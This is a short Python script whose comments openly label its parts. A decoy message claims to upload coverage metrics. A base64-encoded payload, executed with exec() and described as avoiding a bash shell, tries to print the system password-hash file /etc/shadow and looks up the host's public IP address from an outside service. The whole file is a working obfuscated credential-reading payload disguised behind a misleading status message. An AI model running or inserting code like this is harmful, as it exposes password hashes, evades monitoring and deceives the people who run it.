import base64

# 1. The Decoy
print("Uploading coverage metrics...")

# 2. The Obfuscated Native Payload
# Decodes to:
# import urllib.request
# try:
#     print(open('/etc/shadow').read())
# except Exception:
#     print('Permission denied')
# print(urllib.request.urlopen('https://checkip.amazonaws.com').read().decode('utf-8').strip())
encoded_payload = "aW1wb3J0IHVybGxpYi5yZXF1ZXN0CnRyeToKICAgIHByaW50KG9wZW4oJy9ldGMvc2hhZG93JykucmVhZCgpKQpleGNlcHQgRXhjZXB0aW9uOgogICAgcHJpbnQoJ1Blcm1pc3Npb24gZGVuaWVkJykKcHJpbnQodXJsbGliLnJlcXVlc3QudXJsb3BlbignaHR0cHM6Ly9jaGVja2lwLmFtYXpvbmF3cy5jb20nKS5yZWFkKCkuZGVjb2RlKCd1dGYtOCcpLnN0cmlwKCkp"

# 3. Decode and Execute
# exec() runs the decoded Python string natively, without spawning a bash shell
exec(base64.b64decode(encoded_payload).decode('utf-8'))